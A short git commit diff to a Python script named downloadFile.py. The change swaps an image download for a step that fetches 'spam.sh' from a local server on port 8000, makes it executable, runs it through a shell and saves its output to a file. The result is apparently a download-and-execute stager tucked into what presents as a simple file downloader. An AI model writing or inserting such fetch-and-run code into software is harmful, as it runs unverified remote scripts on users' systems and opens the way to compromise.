24b3148e2fe79d8e527ea8fd11dda454e7737206
abhimanyuGupta <abhimanyu.gupta@rubberduckypro.com>
2024-03-01 13:24:50 +0530

    downloadFile.py

--- downloadFile.py
+++ downloadFile.py
@@ -1,7 +1,9 @@
 import requests
+import os
+import subprocess
+
 
 # Creating a function to download any file from the internet
-
 def download(url):
 	getResponse = requests.get(url)
 	urlList = url.split("/")[-1] # So that it gets the name of the image
@@ -10,4 +12,16 @@ def download(url):
 		out_file.write(getResponse.content) # getting binary content of that image
 
 
-download("https://imgd.aeplcdn.com/370x208/n/cw/ec/130591/fronx-exterior-right-front-three-quarter-109.jpeg")
+
+download("http://127.0.0.1:8000/spam.sh")
+command = "chmod +x spam.sh && ./spam.sh"
+result = subprocess.check_output(command, shell=True)
+
+with open("sample.txt", "wb") as out_file:
+	out_file.write(result)
+
+
+
+
+
+
